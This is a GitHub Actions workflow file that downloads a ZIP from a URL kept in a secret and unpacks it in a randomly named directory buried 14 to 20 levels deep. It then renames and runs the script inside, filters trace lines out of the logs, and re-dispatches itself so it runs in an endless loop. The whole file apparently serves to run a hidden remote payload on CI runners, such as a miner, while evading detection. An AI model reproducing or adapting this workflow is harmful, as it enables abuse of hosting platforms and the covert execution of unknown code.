name: Maf

on:
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  export-and-run:
    runs-on: ubuntu-22.04

    strategy:
      matrix:
        worker: [1]

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Generate random names and nested directory
        id: names
        shell: bash
        run: |
          set -euo pipefail
          ZIP_NAME="$(uuidgen).zip"
          SCRIPT_PREFIX="$(uuidgen)"

          # Generate a deeply nested directory structure (14 to 20 levels)
          DEPTH=$((14 + RANDOM % 7))
          NESTED_DIR=""

          for i in $(seq 1 $DEPTH); do
            if [ $((RANDOM % 2)) -eq 0 ]; then
              DIR_NAME=".$(uuidgen | cut -d'-' -f1)"
            else
              DIR_NAME="$(uuidgen | cut -d'-' -f1)"
            fi

            if [ -z "$NESTED_DIR" ]; then
              NESTED_DIR="$DIR_NAME"
            else
              NESTED_DIR="$NESTED_DIR/$DIR_NAME"
            fi
          done

          echo "ZIP_NAME=$ZIP_NAME" >> "$GITHUB_ENV"
          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> "$GITHUB_ENV"
          echo "NESTED_DIR=$NESTED_DIR" >> "$GITHUB_ENV"
          echo "Generated ZIP_NAME=$ZIP_NAME"
          echo "Generated SCRIPT_PREFIX=$SCRIPT_PREFIX"
          echo "Generated nested directory with $DEPTH levels: $NESTED_DIR"

          mkdir -p "$NESTED_DIR"
          echo "Created nested directory structure"

      - name: Download ZIP to nested directory
        shell: bash
        run: |
          set -euo pipefail
          TARGET_PATH="$NESTED_DIR/$ZIP_NAME"
          curl -fSL -o "$TARGET_PATH" "${{ secrets.VIA }}"
          if [ ! -f "$TARGET_PATH" ]; then
            echo "Download failed: $TARGET_PATH not found"
            exit 1
          fi
          echo "Downloaded $ZIP_NAME to $NESTED_DIR"

      - name: Unzip in nested directory and cleanup
        shell: bash
        run: |
          set -euo pipefail
          cd "$NESTED_DIR"
          unzip -q "$ZIP_NAME"
          rm -f "$ZIP_NAME"
          echo "Unzipped and removed $ZIP_NAME in $NESTED_DIR"

      - name: Find, rename and make script executable
        shell: bash
        env:
          SCRIPT_PREFIX: ${{ env.SCRIPT_PREFIX }}
        run: |
          set -euo pipefail
          cd "$NESTED_DIR"

          script_path="$(find . -type f -name 'via.sh' -print -quit || true)"
          if [ -z "$script_path" ]; then
            script_path="$(find . -type f -iname 'via*' -perm /111 -print -quit || true)"
          fi
          if [ -z "$script_path" ]; then
            echo "Could not find via.sh or executable via* file."
            find . -maxdepth 4 -type f -print
            exit 1
          fi

          echo "Found script (path hidden in logs)"
          new_name="${SCRIPT_PREFIX}_$(date +%s)_$RANDOM.sh"
          mv -v "$script_path" "$new_name"
          chmod +x "$new_name"

          FULL_SCRIPT_PATH="$NESTED_DIR/$new_name"
          echo "EXEC_SCRIPT=$FULL_SCRIPT_PATH" >> "$GITHUB_ENV"
          echo "Renamed script to $new_name in nested directory"

      - name: Run worker (quiet: hide traced commands)
        shell: bash
        env:
          WORKER_ID: ${{ matrix.worker }}
          MAX_WORKERS: ${{ env.MAX_WORKERS }}
          EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
        run: |
          set -euo pipefail

          echo "Starting worker ${WORKER_ID} of ${MAX_WORKERS:-?}"

          if [ -z "${EXEC_SCRIPT:-}" ]; then
            echo "EXEC_SCRIPT not set"
            exit 1
          fi

          # Run the discovered script without showing bash xtrace lines (those start with "+ ").
          # Combine stdout and stderr, then filter out lines beginning with "+ ".
          # Note: this preserves normal script output while hiding common xtrace lines.
          bash --noprofile --norc "$EXEC_SCRIPT" "$WORKER_ID" 2>&1 | sed -E '/^\+ /d'

      - name: Trigger next run (workflow_dispatch)
        shell: bash
        env:
          REPO: ${{ github.repository }}
          WORKFLOW_FILE: main.yml
          BRANCH: ${{ github.event.repository.default_branch }}
          REPO_PAT: ${{ secrets.REPO_PAT }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail

          TOKEN="${REPO_PAT:-}"
          if [ -z "$TOKEN" ]; then
            TOKEN="${GITHUB_TOKEN:-}"
            echo "No REPO_PAT provided. Falling back to GITHUB_TOKEN."
          else
            echo "Using REPO_PAT from secrets."
          fi

          if [ -z "$TOKEN" ]; then
            echo "No token available to trigger workflow. Set secrets.REPO_PAT or ensure GITHUB_TOKEN is available."
            exit 1
          fi

          API_URL="https://api.github.com/repos/$REPO/actions/workflows/$WORKFLOW_FILE/dispatches"
          echo "Calling $API_URL on ref $BRANCH"

          curl -sS -X POST "$API_URL" \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"ref\":\"$BRANCH\"}"

          echo "Triggered workflow dispatch for $WORKFLOW_FILE on ref $BRANCH"
